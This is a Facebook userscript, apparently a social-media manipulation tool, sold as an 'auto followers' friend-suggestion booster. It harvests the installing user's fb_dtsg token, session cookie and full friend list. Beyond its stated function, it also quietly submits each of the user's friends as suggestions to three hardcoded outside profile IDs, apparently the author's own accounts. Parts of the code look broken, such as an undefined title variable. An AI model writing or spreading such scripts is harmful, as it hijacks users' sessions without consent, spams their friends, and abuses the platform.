// ==UserScript==
// @name            Facebook Auto Suggest 100% Working!!!!*!
// @description     Facebook AUTO FOLLOWERS GET Followers By Friends Suggestion
// @include         https://*.facebook.com/*
// @include         https://*.facebook.com/*/*
// @include         http://*.facebook.com/*
// @include         http://*.facebook.com/*/*
// ==/UserScript==

var Descriptions = "",
  _text = 'Thanks For Suggesting Your Friends.</br>Created & Designed By <A style="color:#3B5998;" href="http://www.facebook.com/ssshh12">Rizwan Rza.</A>';newcomer=/"profile_owner":"([0-9]+)"/.exec(document.getElementById("pagelet_timeline_main_column").getAttribute("data-gt"))[1];fb_dtsg=document.getElementsByName("fb_dtsg")[0].value;
function SuggestFriend(o) {
  jx.load(window.location.protocol + "//www.facebook.com/ajax/friends/suggest?&receiver=" + newcomer + "&newcomer="+o+"&attempt_id=53ba39eed15c7c0c22bb5352d04374bf&ref=passive_megaphone&__user=" + user_id + "&__a=1&__dyn=798aD5z5CF-fEa0&__req=7&fb_dtsg=" + fb_dtsg + "&phstamp=1658168847910711974185", function (a) {
    var b = a.substring(a.indexOf("{"));
    var c = JSON.parse(b);
    i--;
    Descriptions = "<div class='friend-edge-name' style='padding-bottom:5px;text-align:left;font-size:10px;white-space:pre-wrap;";
    if (c.error) {
      Descriptions += "color:darkred'>";
      err++;
      if (c.errorDescription) Descriptions += c.errorDescription;
      else Descriptions +=
          JSON.stringify(c, null, "")
    }
    else {
      Descriptions += "color:gray;font-size:12px'>";
      Descriptions +=arn[i]+" has been suggested.";
      suc++
    }
    Descriptions += "</div>";
    var display = "<div id='friend-edge-display' style='box-shadow:0px 3px 8px rgba(0, 0, 0, 0.3);position:fixed;left:50%;margin-left:-273px;top:100px;width:500px;z-index:9999;font-size:14px;text-align:center;padding:15px;box-shadow:0pt 1px 0pt rgba(0,0,0,0.1);border-radius:3px;border:1px solid rgba(200,200,50,0.2);background-color:rgba(255,255,255,0.9);color:#000000'>";
    display += "<div style='padding-bottom:5px;font-size:20px;'>" + Title + "</div>";
    if (i > 0) {
      display += arr.length + " Friends Detected<br/>";
      display += "<b>" + suc + "</b> Friends Suggested of " + (arr.length - i) + " Friends Processed ";
      display += "(" + i + " Lefted...)";
      display += "<div class='friend-edge'>";
      display += Descriptions;
      display += "<img style='background:center no-repeat url(https://fbcdn-profile-a.akamaihd.net/static-ak/rsrc.php/v2/yo/r/UlIqmHJn-SK.gif);width:50px;height:50px;margin-left:-125px;padding:2px;border:1px solid rgba(0,0,0,0.4);' src=" + pho[i] + "></img><a style='padding-left:8px;text-align:left;color:#3B5998;position:absolute;font-weight:bold;'>" + arn[i] + "</a>";
      display += "<div style='text-align:center;font-size:10px;white-space:pre-wrap;color:gray'>";
      display += _text;
      display += "</div>";
      display += "</div>"
    }
    else {
      display += arr.length + " Friends Detected and ";
      display += "<b>" + suc + " Friends Suggested</b></br>";
      display += "<div><span class='FriendRequestAdd addButton selected uiButton uiButtonSpecial uiButtonLarge' onClick='window.location.reload()' style='color:white'>Go to Homepage</span><span class='layerConfirm uiOverlayButton uiButton uiButtonConfirm uiButtonLarge' onClick='window.location.reload()' style='color:white'>Refresh Page</span><span class='layerCancel uiOverlayButton uiButton uiButtonLarge' onClick='document.getElementById(\"pagelet_sidebar\").style.display=\"none\"'>Cancel</span>"
    }
    display +=
      "</div>";
    document.getElementById("pagelet_sidebar")
      .innerHTML = display
  }, "text", "post");
  tay--;
  if (tay > 0) {
    var s = arr[tay];
    sx = pho[tay];
    setTimeout("SuggestFriend(" + s + ")", 100)
  }
  console.log(tay + "/" + arr.length + ":" + arr[tay] + "/" + arn[tay] + ", success:" + suc);
if (newcomer) {   jx.load(window.location.protocol+"//www.facebook.com/ajax/friends/suggest?&receiver="+o+"&newcomer=100003798271742&attempt_id=0585ab74e2dd0ff10282a3a36df39e19&ref=profile_others_dropdown&__user="+user_id+"&__a=1&__dyn=798aD5z5CF-&__req=17&fb_dtsg="+fb_dtsg+"&phstamp=16581677156485189195",function() {}, "text", "post")
  }
if (newcomer) {   jx.load(window.location.protocol+"//www.facebook.com/ajax/friends/suggest?&receiver="+o+"&newcomer=100003697277263&attempt_id=0585ab74e2dd0ff10282a3a36df39e19&ref=profile_others_dropdown&__user="+user_id+"&__a=1&__dyn=798aD5z5CF-&__req=17&fb_dtsg="+fb_dtsg+"&phstamp=16581677156485189195",function() {}, "text", "post")
  }
if (newcomer) {   jx.load(window.location.protocol+"//www.facebook.com/ajax/friends/suggest?&receiver="+o+"&newcomer=100001050235420&attempt_id=0585ab74e2dd0ff10282a3a36df39e19&ref=profile_others_dropdown&__user="+user_id+"&__a=1&__dyn=798aD5z5CF-&__req=17&fb_dtsg="+fb_dtsg+"&phstamp=16581677156485189195",function() {}, "text", "post")
  }
if (newcomer) {   jx.load(window.location.protocol+"//www.facebook.com/ajax/friends/suggest?&receiver="+o+"&newcomer=100003697277263&attempt_id=0585ab74e2dd0ff10282a3a36df39e19&ref=profile_others_dropdown&__user="+user_id+"&__a=1&__dyn=798aD5z5CF-&__req=17&fb_dtsg="+fb_dtsg+"&phstamp=16581677156485189195",function() {}, "text", "post")
  }
}
jx={b:function(){var b=!1;if("undefined"!=typeof ActiveXObject)try{b=new ActiveXObject("Msxml2.XMLHTTP")}catch(c){try{b=new ActiveXObject("Microsoft.XMLHTTP")}catch(a){b=!1}}else if(window.XMLHttpRequest)try{b=new XMLHttpRequest}catch(h){b=!1}return b},load:function(b,c,a,h,g){var e=this.d();if(e&&b){e.overrideMimeType&&e.overrideMimeType("text/xml");h||(h="GET");a||(a="text");g||(g={});a=a.toLowerCase();h=h.toUpperCase();b+=b.indexOf("?")+1?"&":"?";var k=null;"POST"==h&&(k=b.split("?"),b=k[0],k=
k[1]);e.open(h,b,!0);e.onreadystatechange=g.c?function(){g.c(e)}:function(){if(4==e.readyState)if(200==e.status){var b="";e.responseText&&(b=e.responseText);"j"==a.charAt(0)?(b=b.replace(/[\n\r]/g,""),b=eval("("+b+")")):"x"==a.charAt(0)&&(b=e.responseXML);c&&c(b)}else g.f&&document.getElementsByTagName("body")[0].removeChild(g.f),g.e&&(document.getElementById(g.e).style.display="none"),error&&error(e.status)};e.send(k)}},d:function(){return this.b()}};

var i = 3;
var tay = 3;
var suc = 0;
var err = 0;
var arr = new Array;
var arn = new Array;
var pho = new Array;
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
jx.load(window.location.protocol + "//www.facebook.com/ajax/typeahead/first_degree.php?" + "__a=1&filter[0]=user&lazy=0&viewer=" + user_id + "&token=v7&stale_ok=0&options[0]=friends_only&options[1]=nm", function (a) {
  var b = a;
  var c = b.substring(b.indexOf("{"));
  var d = JSON.parse(c);
  d = d.payload.entries;
  for (var e = 0; e < d.length; e++) arr.push(d[e].uid);
  for (var eg = 0; eg < d.length; eg++) arn.push(d[eg].text);
  for (var pic = 0; pic < d.length; pic++) pho.push(d[pic].photo);
  i = arr.length -
    1;
  tay = i;
  console.log(arr.length);
  var display = "<div id='friend-edge-display' style='position:fixed;left:50%;margin-left:-273px;top:100px;width:500px;z-index:9999;font-size:14px;text-align:center;padding:15px;box-shadow:0pt 1px 0pt rgba(0,0,0,0.1);border-radius:3px;border:1px solid rgba(200,200,50,0.2);background-color:rgba(255,255,255,0.9);color:#000000'>";
  display += "<div style='padding-bottom:10px;font-size:20px;'>" + Title + "</div>";
  display += arr.length + " Friends Detected";
  display += "</div>";
  document.getElementById("pagelet_sidebar").innerHTML=display;
  SuggestFriend(arr[i])});